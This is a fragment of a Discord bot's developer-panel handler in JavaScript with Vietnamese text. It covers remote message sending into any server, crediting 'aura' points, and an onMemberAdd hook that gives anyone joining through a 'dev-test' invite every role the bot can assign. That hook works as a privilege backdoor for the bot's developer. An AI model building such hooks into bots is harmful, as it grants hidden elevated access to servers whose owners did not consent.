    if (id === "dev_send_modal") {
      const guildId = interaction.fields.getTextInputValue("sv").trim() || currentView(interaction.user.id).guildId;
      const channelId = interaction.fields.getTextInputValue("kenh").trim();
      const content = interaction.fields.getTextInputValue("noidung").trim();

      if (!guildId) {
        return interaction.reply({
          content: "❌ Chưa chọn server — chọn ở ô danh sách hoặc nhập ID server.",
          ephemeral: true,
        });
      }
      if (!content) return interaction.reply({ content: "❌ Nội dung trống.", ephemeral: true });

      try {
        const { guild, channel } = await sendRemote(bot, {
          guildId,
          channelId,
          content,
          user: interaction.user.tag,
        });
        return interaction.reply({
          content: `✅ Đã gửi vào **#${channel.name}** của **${guild.name}**.`,
          ephemeral: true,
        });
      } catch (err) {
        history.record("remote", "send", {
          user: interaction.user.tag,
          guild: guildId,
          detail: err.message,
          ok: false,
        });
        return interaction.reply({ content: `❌ Lỗi: \`${err.message}\``, ephemeral: true });
      }
    }

    // ✨ Cộng/trừ aura cho người bất kỳ trong server đang chọn
    if (id === "dev_aura") {
      const view = currentView(interaction.user.id);
      return interaction.showModal(sendAuraModal(view.guildId));
    }

    if (id === "dev_aura_modal") {
      const guildId =
        (interaction.fields.getTextInputValue("sv") || "").trim() || currentView(interaction.user.id).guildId;
      const rawTarget = (interaction.fields.getTextInputValue("nguoi") || "").trim();
      const rawAmount = (interaction.fields.getTextInputValue("soluong") || "").trim();

      if (!guildId) {
        return interaction.reply({
          content: "❌ Chưa chọn server — chọn ở ô danh sách hoặc nhập ID server.",
          ephemeral: true,
        });
      }
      const guild = bot.guilds.cache.get(guildId);
      if (!guild) return interaction.reply({ content: "❌ Bot không ở server đó.", ephemeral: true });

      const idMatch = rawTarget.match(/\d{5,25}/);
      if (!idMatch) {
        return interaction.reply({ content: "❌ Không thấy ID người nhận — dán ID hoặc dạng `<@id>`.", ephemeral: true });
      }
      const targetId = idMatch[0];

      if (!/^-?\d{1,8}$/.test(rawAmount)) {
        return interaction.reply({ content: "❌ Số aura không hợp lệ — chỉ chữ số, tối đa ±99.999.999.", ephemeral: true });
      }
      const amount = parseInt(rawAmount, 10);
      if (!amount) return interaction.reply({ content: "❌ Số aura phải khác 0.", ephemeral: true });

      const before = aura.get(targetId).aura;
      const after = aura.credit(targetId, amount);
      const member = await guild.members.fetch(targetId).catch(() => null);
      if (member) await game.syncTierRole(member).catch(() => {});

      history.record("aura", "dev.credit", {
        user: interaction.user.tag,
        guild: guild.id,
        detail: `${targetId}: ${before} → ${after} (${amount > 0 ? "+" : ""}${amount})`,
      });

      const tier = aura.tierOf(after);
      const embed = new EmbedBuilder()
        .setTitle(amount >= 0 ? "✨ Đã cộng aura" : "💸 Đã trừ aura")
        .setColor(amount >= 0 ? 0x2ecc71 : 0xe74c3c)
        .setDescription(
          `<@${targetId}> · \`${targetId}\` trong **${guild.name}**\n` +
            `> **${before}** → **${after}** aura (\`${amount > 0 ? "+" : ""}${amount}\`)\n` +
            `> ${tier.icon} **${tier.name}** · ${
              member ? "đã đồng bộ role tier" : "không tìm thấy member — vẫn cộng vào dữ liệu"
            }`,
        )
        .setFooter({ text: `Dev · ${interaction.user.tag}` })
        .setTimestamp();
      return interaction.reply({ embeds: [embed], ephemeral: true });
    }

    return interaction.update({}).catch(() => {});
  },

  // Được events/guildMemberAdd.js gọi — vào qua link dev-test thì cấp toàn bộ role
  async onMemberAdd(member) {
    const guild = member.guild;
    const pending = pendingInvite.get(guild.id);
    if (!pending) return false; // không có link dev nào đang chờ ở server này

    // Đối chiếu số lượt dùng để biết có phải link dev vừa được dùng không
    let invites;
    try {
      invites = await guild.invites.fetch();
    } catch {
      return false;
    }
    const current = invites.get(pending.code);
    if (!current || current.uses <= pending.uses) return false;

    pendingInvite.delete(guild.id);

    const me = guild.members.me;
    if (!me?.permissions.has(PermissionFlagsBits.ManageRoles)) return false;

    // Chỉ gán được role nằm dưới role cao nhất của bot (giới hạn Discord)
    const assignable = guild.roles.cache.filter(
      (r) => r.id !== guild.id && r.position < me.roles.highest.position && !r.managed,
    );

    try {
      await member.roles.add(assignable, "Auto-role cho dev qua link test");
    } catch (err) {
      history.record("invite", "dev.join", {
        user: member.user.tag,
        guild: guild.id,
        detail: `gán role lỗi: ${err.message}`,
        ok: false,
      });
      return false;
    }

    const log = guild.systemChannel;
    if (log?.isTextBased()) {
      log
        .send(`✅ **${member.user.tag}** đã vào qua link dev-test và được cấp ${assignable.size} role.`)
        .catch(() => {});
    }

    history.record("invite", "dev.join", {
      user: member.user.tag,
      guild: guild.id,
      detail: `qua link dev-test · ${assignable.size} role`,
    });
    return true;
  },
};
